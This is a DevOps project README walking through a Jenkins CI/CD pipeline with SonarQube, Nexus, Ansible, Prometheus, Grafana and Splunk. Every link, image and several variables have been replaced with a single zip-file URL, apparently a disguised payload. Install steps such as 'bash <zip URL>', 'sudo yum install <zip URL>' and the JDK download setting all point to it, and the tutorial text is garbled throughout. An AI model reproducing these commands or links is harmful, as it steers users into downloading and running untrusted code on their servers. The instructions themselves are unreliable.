...
![CompleteCICDProject!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) 

###### Project ToolBox 🧰
- [Git](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) Git will be used to manage our application source code.
- [Github](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) Github is a free and open source distributed VCS designed to handle everything from small to very large projects with speed and efficiency
- [Jenkins](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) Jenkins is an open source automation CI tool which enables developers around the world to reliably build, test, and deploy their software
- [Maven](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) Maven will be used for the application packaging and building including running unit test cases
- [Checkstyle](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) Checkstyle is a static code analysis tool used in software development for checking if Java source code is compliant with specified coding rules and practices.
- [SonarQube](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) SonarQube Catches bugs and vulnerabilities in your app, with thousands of automated Static Code Analysis rules.
- [Nexus](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) Nexus Manage Binaries and build artifacts across your software supply chain
- [Ansible](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) Ansible will be used for the application deployment to both lower environments and production
- [EC2](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) EC2 allows users to rent virtual computers (EC2) to run their own workloads and applications.
- [Slack](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) Slack is a communication platform designed for collaboration which can be leveraged to build and develop a very robust DevOps culture. Will be used for Continuous feedback loop.
- [Prometheus](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) Prometheus is a free software application used for event/metric monitoring and alerting for both application and infrastructure.
- [Grafana](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) Grafana is a multi-platform open source analytics and interactive visualization web application. It provides charts, graphs, and alerts for the web when connected to supported data sources.
- [Splunk](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) Splunk is an innovative technology which searches and indexes application/system log files and helps organizations derive insights from the data.
...
1) Create a GitHub Repository with the name `Jenkins-Realworld-CICD-Project` and push the code in this branch(main) to 
    ...
    - Go to GitHub: https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip
    ...
    - Download the code in in this repository `"Main branch"`: https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip
    ...
    ![ProjectRepositoryCode!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
- Navigate to IAM
![IAM!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-10-03%20at%206.20.44%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
    - Click on `Roles`
...
3) Jenkins/Maven/Ansible
    ...
    - AMI: `Amazon Linux 2`
    - Instance type: `https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip`
    - Key pair: `Select` or `create a new keypair`
    - Security Group (Edit/Open): `8080, 9100` and `22 to 0.0.0.0/0`
    - IAM instance profile: Select the `AWS-EC2FullAccess-Role`
    - User data (Copy the following user data): https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip
    - Launch Instance
...
![PipelineEnvSetup!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%202024-02-10%20at%202.17.03%E2%80%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)

12) Slack 
    - Go to the bellow Workspace and create a Private Slack Channel and name it "yourfirstname-jenkins-cicd-pipeline-alerts"
    - Link: https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip~AbhQYQ  
      ...
      ![SlackConfig!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-26%20at%202.08.55%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
### Configure Promitheus With (Service Discovery)
  ...
  - Clone repository: `git clone https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip`
  ...
  - Install Prometheus: `bash https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip`
...
### Configure The "Node Exporter" on the "Dev", "Stage" and "Prod" instances including your "Pipeline Infra"
  ...
  - Install The Node Exporter: `bash https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip`
  - Confirm the status shows *"Active (running)"*
...
### Configure The "Node Exporter" on the "Jenkins-Maven-Ansible", "Nexus" and "SonarQube" instances 
  ...
  - Exit
  ![NodeExporter!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-26%20at%202.00.23%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
### Confirm That The Prometheus Service Disconvery Config Works As Expected
  ...
  ![ConfigurePrometheus!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%202024-02-10%20at%204.44.02%E2%80%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
### Open a New Tab on your browser for Grafana also if you've not done so already. 
  ...
  - Once the UI Opens pass the following username and password
      ...
      - New Password: `admin`
      - Click on `Submit`
  ![ConfigureGrafana!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
  ...
  - Download the Prometheus `Node Exporter Full` Grafana Dashboard JSON
    - Click on this link to Download the JSON: https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip
  ...
  ![GrafanaMetrics!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
  ...
  ![GrafanaMetrics!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20(1).png)
...
- **NOTE:** Run The Following Commands On The `Splunk Server/Indexer Only`
    ...
    - Link: 
    ```bash
    wget -O https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip "https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip"
    ```
    - Install Splunk
    ```
    sudo yum install https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip -y
    ```
...
- NOTE: The Password must be up to `8` characters. You can assign `adminadmin`
    ![SplunkSetup1!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-28%20at%2010.48.24%20AM%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
- Access your Splunk Installation at http://Splunk-Server-IP:8000 and log into splunk
    ...
    ![SplunkSetup2!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
- **NOTE(MANDATORY):** Once you login to the splunk Indexer
    ...
    - Confirm that 
    ![SplunkSetup3!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-29%20at%2010.34.45%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
![SplunkSetup4!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-07-02%20at%209.50.16%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
![SplunkSetup4!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) 
...
![SplunkSetup4!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-29%20at%2011.39.03%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)

- Application Log Indexed
![SplunkSetup3!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-29%20at%2010.55.36%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
1) #### Access Jenkins
    ...
    ![JenkinsSetup1!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) 
    ...
    ![JenkinsSetup2!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-24%20at%208.49.43%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) 
...
2)  #### Plugin installations:
    ...
    ![PluginInstallation!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-24%20at%2010.07.32%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
    - Refresh your Browser and Log back into Jenkins
    - Once you log back into Jenkins

3)  #### Global tools configuration:
    - Click on Manage Jenkins -->> Global Tool Configuration
    ![JDKSetup!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
    ...
    - **JDK** 
        ...
        * Select `Extract *.zip/*https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip` 
        * Name: **`localJdk`**
        * Download URL for binary archive: **https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip**
        * Subdirectory of extracted archive: **`jdk-11.0.1`**
    - **Git** 
      - Click on `Add Git` 
      - Enable `Install automatically`(Optional)
      ![GitSetup!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-24%20at%209.36.23%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
    
    - **SonarQube Scanner** 
      - Click on `Add SonarQube Scanner` 
      - Enable: `Install automatically` (Optional)
      ![SonarQubeScanner!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-24%20at%209.35.20%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
    ...
    - Click on `SAVE`
    ![MavenSetup!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-24%20at%209.44.14%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
4)  #### Credentials setup(SonarQube, Nexus, Ansible and Slack):
    - Click on `Manage Jenkins` 
      ...
      2)  ##### Slack secret token (slack-token)
          - ###### Get The Slack Token: 
              - Slack: https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip~AbhQYQ
      ...
      3)  ##### Nexus Credentials (Username and Password)
          - ###### Login to Nexus and Set Password
	          ...
	          - Command: ``sudo cat https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip``
      ...
      4)  ##### Ansible deployment server credential (username & password)
          ...
          - Click on `Create`   
      ![SonarQubeServerSetup!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-27%20at%202.10.40%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
5)  #### Configure system:    
    1)  - Click on ``Manage Jenkins`` 
        ...
        ![SonarQubeServerSetup!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-24%20at%2010.13.39%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
    ...
    2)  - Still on `Manage Jenkins` and `Configure System`
        ...
        - Go to section `Slack`
            ...
            - Click on `Save`
        ![SlackSetup!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-24%20at%2010.31.12%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
2)  ### Setup SonarQube GateKeeper
    ...
    ![SonarQubeSetup2!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
    - Click on `Save` to Create
    ![SonarQubeSetup2!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-24%20at%2011.00.25%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
    - Add a Quality Gate Condition to Validate the Code Against (Code Smells or Bugs)
    ![SonarQubeSetup3!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-24%20at%2011.02.36%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
    ...
    ![SonarQubeSetup3!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
3)  ### Setup SonarQube Webhook to Integrate Jenkins (To pass the results to Jenkins)
    ...
    ![SonarQubeSetup4!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-24%20at%2011.08.26%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
- Update Your `Nexus IP` in the `Jenkinsfile` on `Line 80`
    ...
    ![JenkinsJobResult!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)

    - SonarQube Code Inspection Result
    ![SonarQubeResult!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)

    - Slack Continuous Feedback Alert
    ![SlackResult!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)

    - SonarQube GateKeeper Webhook Payload
    ![SonarQubeGateKeeper!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
1)  ### Navigate to Accessing Nexus: 
    ...
    - CREATE 3rd REPO (Proxy/Remote Repo): 
        ...
        - Version Policy: Select `Release`
        - Remote Storage: https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip 
        - Click `Create Repository`
    ...
    ![NexusSetup!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-27%20at%203.42.03%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip) 

### Update Maven POM and Integrate/Configure Nexus With Jenkins
A) Update Maven `https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip` file
...
- **`NOTE:`** The following `environment` config represents the NEXUS CREDENTIAL stored in jenkins. we're pulling the credential with the use of the predefine ``NEXUS_CREDENTIAL_ID`` environment variable key. Which jenkins already understands. 
  ```bash
  environment {
    WORKSPACE = "${https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip}"
  ...
  stage("Nexus Artifact Uploader"){
      steps{
          nexusArtifactUploader(
            ...
            groupId: 'webapp',
            version: "${https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip}-${https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip}",
            repository: 'maven-project-releases',  //"${NEXUS_REPOSITORY}",
            credentialsId: "${NEXUS_CREDENTIAL_ID}",
            artifacts: [
                [artifactId: 'webapp',
                classifier: '',
                file: 'https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip',
                type: 'war']
            ]
          )
      }
...
- Test your Pipeline to `Make Sure That The Artifacts Upload Stage Succeeds` including the `Deployments`.
    ...
    - Click on `Build Now`
![PipelineStagesArtifactSuccess!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-27%20at%204.44.30%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)

- Navigate to `Nexus` as well to confirm that the artifact was `Stored` in the `maven-project-releases` repository
![ArtifactStored!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-27%20at%204.08.33%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
...
- **`NOTE:`** However, you may not be able to reach the Web Application. This could be due to the fact that you're using a different `Region` as compared to what's actually stated in the `https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip` config script.
    - To Reolve this issue, Navigate to this file 
      - Go to your `Project Code`
      - Open the `ansible-config` folder
      - You will see the `https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip` config file
...
![PipelineStagesCompleted!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-27%20at%204.44.30%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)

- Verify/Confirm Slack Success Feedback.
![SlackSuccessAllStages!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip%20Shot%202023-04-27%20at%205.06.44%https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)

- Confirm Access to your application: http://Dev-or-Stage-or-Prod-PubIP:8080/webapp/
![FinalProductDisplay!](https://github.com/ShubhamJadhav72/Capstone8Deploy/raw/refs/heads/main/.github/workflows/Capstone-Deploy-v1.7.zip)
